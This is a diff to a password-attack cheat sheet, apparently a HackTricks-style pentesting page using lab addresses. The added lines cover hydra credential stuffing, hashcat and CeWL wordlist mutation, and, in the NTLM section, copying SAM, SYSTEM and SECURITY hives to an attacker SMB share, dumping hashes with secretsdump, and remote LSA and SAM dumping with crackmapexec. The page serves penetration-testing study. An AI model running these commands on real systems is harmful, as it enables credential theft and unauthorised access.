@@ -40,10 +40,55 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 * [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
+```bash
+# Credential Stuffing
+# - Using known default credentials or leaked credential combos.
+# - Example list: DefaultCreds-Cheat-Sheet. https://github.com/ihebski/DefaultCreds-cheat-sheet 
+creds search kali
+
+#  Hydra Syntax for Credential Stuffing
+hydra -C <user_pass.list> <protocol>://<IP>
+hydra -C user_pass.list ssh://10.129.42.197 #Example (SSH)
+```
 ## **Create your own Dictionaries**
 
 Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+### hashcat 
+```bash
+# Basic idea: Users make predictable password mutations (e.g. Name2024!, P@ssw0rd).
+# Use Hashcat rules to generate realistic mutations.
 
+# Sample password list
+cat password.list
+# rawen
+
+# Sample custom Hashcat rule file
+cat custom.rule
+# :
+# c                 # Capitalize first letter
+# so0               # Replace o with 0
+# sa@               # Replace a with @
+# $!                # Add '!' at the end
+# combinations like:
+# $! c so0 sa@      # Add '!', capitalize, o→0, a→@
+
+# Generate mutated password list with Hashcat rules
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+
+# One of the most used rules is best64.rule, which can often lead to good results
+sed -ri '/^.{,9}$/d' mut_password.list  # Remove all passwords shorter than 10 with sed -ri '/^.{,9}$/d' mut_password.list 
+
+# Use existing rules (e.g., best64.rule)
+ls /usr/share/hashcat/rules/
+# best64.rule, toggles1.rule, leetspeak.rule, etc.
+
+# Extract potential keywords from a website using CeWL
+cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+
+# Count words in generated list
+wc -l inlane.wordlist
+# Example output: 326
+```
 ### Crunch
 
 ```bash
@@ -387,7 +432,7 @@ ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
-
+> use -c 1 TIME   wait time per login attempt
 ### Redis
 
 ```bash
@@ -653,10 +698,28 @@ john jwt.john #It does not work with Kali-John
 ### NTLM cracking
 
 ```bash
+# Copying SAM Registry Hives
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+
+# move the registrys to attacker machine
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tmp /tmp # Creating a Share
+move sam.save \\10.10.15.16\tmp
+move security.save \\10.10.15.16\tmp
+move system.save \\10.10.15.16\tmp
+
+# Dumping Hashes with Impacket's secretsdump.py
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
+
+# Remote Dumping & LSA Secrets Considerations
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # Dumping LSA Secrets Remotely (Domains  cached creds + Services creds )
+crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # Dumping SAM Remotely
 ```
 
 ### Keepass
